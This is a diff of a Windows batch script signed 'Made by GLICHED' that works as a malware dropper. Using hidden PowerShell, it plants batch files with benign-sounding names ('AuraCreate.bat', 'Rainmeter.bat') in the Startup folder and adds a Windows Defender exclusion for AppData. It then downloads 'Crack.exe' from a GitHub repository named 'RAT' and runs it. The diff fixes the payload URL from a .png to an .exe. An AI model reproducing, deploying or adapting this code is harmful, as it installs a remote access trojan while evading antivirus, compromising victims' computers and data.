@@ -10,7 +10,7 @@ set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
-set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
+set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
@@ -23,4 +23,4 @@ set "RAINMETER_BAT_FILE=%STARTUP_FOLDER%\Rainmeter.bat"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%RAINMETER_BAT_URL%', '%RAINMETER_BAT_FILE%')"
 exit
 :: Made by GLICHED 
-:: v4
+:: v4.1
